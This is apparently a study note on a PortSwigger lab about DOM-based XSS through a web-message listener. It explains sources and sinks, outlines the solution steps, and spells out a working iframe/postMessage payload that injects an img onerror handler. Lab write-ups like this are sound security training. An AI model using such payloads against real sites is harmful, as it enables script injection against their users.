# Lab: DOM XSS using web messages

**Official lab:** [https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

## Lab idea

This lab focuses on a web-message listener whose handling can lead to DOM-based cross-site scripting (DOM XSS). It practices tracing message data from its source through client-side event handling and recognizing when it can affect an unsafe DOM operation.

## Vulnerability in brief
The Document Object Model (DOM) is the browser’s structured representation of a page and its elements. DOM manipulation is routine; vulnerabilities arise when client-side JavaScript takes attacker-controllable data from a **source** and passes it unsafely to a potentially dangerous **sink**. This topic is a family of client-side vulnerability classes, not a general learning or testing category. DOM-based cross-site scripting is commonly abbreviated **DOM XSS**.

## Solution idea
1. Notice that the home page contains an addEventListener() call that listens for a web message.
2. Go to the exploit server and add the following iframe to the body.
3. Store the exploit and deliver it to the victim.

## Payloads / key values
- `addEventListener()`
- `iframe`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
- `postMessage()`
- `div`
- `ads`
- `img`
- `src`
- `onerror`

## Official source
- [PortSwigger Academy: Lab: DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
